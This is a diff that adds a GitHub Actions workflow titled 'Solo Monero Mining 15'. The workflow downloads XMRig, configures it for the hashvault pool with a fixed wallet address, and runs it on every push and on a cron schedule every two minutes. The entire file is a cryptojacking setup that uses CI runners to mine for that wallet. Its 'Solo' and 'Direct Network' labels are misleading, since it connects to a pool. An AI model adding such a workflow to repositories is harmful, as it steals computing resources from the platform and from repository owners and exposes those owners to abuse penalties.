@@ -1,0 +1,97 @@
+name: Solo Monero Mining 15
+
+on:
+  push:
+  schedule:
+    - cron: '*/2 * * * *'  # Run every 2 minutes
+  workflow_dispatch:
+
+jobs:
+  solo-monero-mining:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    
+    steps:
+    - name: Setup Solo Mining Environment
+      run: |
+        sudo apt-get update -q
+        sudo apt-get install -y wget curl build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+        
+    - name: Download XMRig Solo Miner
+      run: |
+        wget -q https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz
+        tar -xf xmrig-6.20.0-linux-x64.tar.gz
+        mv xmrig-6.20.0/* .
+        chmod +x xmrig
+        
+    - name: Configure Solo Mining Setup
+      run: |
+        cat > config.json << 'EOF'
+        {
+          "autosave": true,
+          "cpu": {
+            "enabled": true,
+            "huge-pages": true,
+            "hw-aes": null,
+            "priority": 2,
+            "memory-pool": false,
+            "yield": true,
+            "asm": true,
+            "argon2-impl": null,
+            "cn/0": false,
+            "cn-lite/0": false
+          },
+          "opencl": false,
+          "cuda": false,
+          "pools": [
+            {
+              "coin": "monero",
+              "algo": "rx/0",
+              "url": "pool.hashvault.pro:7777",
+              "user": "42FLZRFF6gv89vZGuNEtpsENcwXdAKhysQQD8mTwJZWmLuj7gu6AviLYV7XP1Bysd8K4ZZC2ymALx42MbbGqaMDxEwHewvn",
+              "pass": "SoloMiner-15-${{ github.repository }}",
+              "rig-id": "GitHub-Solo-${{ github.run_id }}",
+              "nicehash": false,
+              "keepalive": true,
+              "enabled": true,
+              "tls": false,
+              "daemon": false,
+              "self-select": null
+            }
+          ],
+          "print-time": 30,
+          "retries": 5,
+          "retry-pause": 3,
+          "syslog": false,
+          "user-agent": "XMRig-Solo",
+          "verbose": 1,
+          "watch": true,
+          "pause-on-battery": false,
+          "pause-on-active": false
+        }
+        EOF
+        
+    - name: Start Solo Monero Mining
+      run: |
+        echo "=== SOLO MONERO MINING STARTED ==="
+        echo "Miner ID: 15"
+        echo "Repository: ${{ github.repository }}"
+        echo "Wallet: 42FLZRFF6gv89vZGuNEtpsENcwXdAKhysQQD8mTwJZWmLuj7gu6AviLYV7XP1Bysd8K4ZZC2ymALx42MbbGqaMDxEwHewvn"
+        echo "Mining Mode: Solo (Direct Network)"
+        echo "Session Start: $(date)"
+        
+        timeout 300 ./xmrig --config=config.json || echo "Mining session completed"
+        
+    - name: Mining Session Report
+      run: |
+        echo "=== SOLO MINING SESSION COMPLETED ==="
+        echo "Repository: ${{ github.repository }}"
+        echo "Miner ID: 15"
+        echo "Wallet Address: 42FLZRFF6gv89vZGuNEtpsENcwXdAKhysQQD8mTwJZWmLuj7gu6AviLYV7XP1Bysd8K4ZZC2ymALx42MbbGqaMDxEwHewvn"
+        echo "Mining Duration: 5 minutes"
+        echo "Mining Mode: Solo Monero (XMR)"
+        echo "Network: Direct Connection"
+        echo "Session End: $(date)"
+        echo "Next Run: In 2 minutes"
+        echo "Run ID: ${{ github.run_id }}"
+        echo "Status: ACTIVE"
